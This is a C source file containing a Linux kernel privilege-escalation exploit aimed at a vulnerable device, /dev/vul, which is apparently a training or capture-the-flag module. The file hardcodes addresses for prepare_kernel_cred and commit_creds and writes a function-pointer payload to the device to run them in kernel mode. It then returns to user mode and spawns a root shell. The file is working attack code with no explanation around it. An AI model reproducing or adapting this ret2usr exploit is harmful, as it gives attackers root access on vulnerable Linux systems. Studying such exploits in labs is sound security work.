#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include "exp.h"

long rflags;
long stack[256];

void* (*prepare_kernel_cred)(void*) = (void* (*)(void*))0xffffffff810a2730;
int (*commit_creds)(void*) = (int (*)(void*))0xffffffff810a2340;

static void user_mode_shellcode()
{
    system("sh");
    exit(0);
}

static void kernel_mode_shellcode()
{
    commit_creds(prepare_kernel_cred(NULL));
    return_to_user_mode((long)user_mode_shellcode, rflags, (long)(&stack[252]));
}

int main()
{
    int fd;
    long payload[] = {4, (long)kernel_mode_shellcode};

    rflags = save_user_mode_rflags();

    fd = open("/dev/vul", O_WRONLY);
    write(fd, payload, sizeof(payload));
    close(fd);

    puts("Nothing happened...");

    return 0;
}
